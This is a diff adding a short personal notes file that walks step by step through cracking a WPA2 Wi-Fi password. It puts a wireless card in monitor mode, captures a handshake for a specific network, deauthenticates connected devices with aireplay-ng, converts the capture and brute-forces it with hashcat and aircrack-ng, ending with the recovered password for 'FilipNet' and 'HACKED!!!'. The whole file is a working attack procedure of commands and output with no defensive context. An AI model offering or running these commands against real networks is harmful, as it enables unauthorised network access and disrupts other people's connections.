@@ -1,0 +1,20 @@
+sudo airmon-ng check kill --> kill all processes that would interfere with airmon-ng
+
+sudo airmon-ng start wlp0s20f3 --> put wifi NIC to monitor mode
+
+sudo airodump-ng wlp0s20f3mon --> scan for wifi network to hack. Look for MAC and channel number
+
+sudo airodump-ng -w wpa2hack -c 1 --bssid 76:24:47:FC:6F:DD wlp0s20f3mon --> start looking for WPA handshake if there is none use the next command to deauthenticate connected devices 
+
+sudo aireplay-ng --deauth 0 -a 76:24:47:FC:6F:DD wlp0s20f3mon --> use to deauthenticate connected devices if needed 
+
+sudo airmon-ng stop wlp0s20f3mon --> put NIC back to Managed mode
+
+wget https://github.com/hashcat/hashcat-utils/archive/master.zip
+./hashcat-utils-master/src/cap2hccapx.bin Documents/Handshake.pcap wpa2.hccapx --> convert handshake cap file to hccapx for hashcat
+
+---> download/install/build hashcat 5.x (6+ doesnot allow 2500 mode, and my NIC doesn't support injection mode so I can't use 22000 mode)
+./hashcat64.bin -m 2500 -a 3 ~/wpa2.hccapx ?u?l?l?l?l?l?l?l?l --> gives back d1bf6bfbdca86815835c1769cbbc8432:762447fc6fdd:b010410dc167:FilipNet:Jedrilica -> HACKED!!!
+
+sudo aircrack-ng wpa2hack.cap -w /usr/share/wordlist/rockyou.txt --> Jedrilica after adding it to the list :)
+
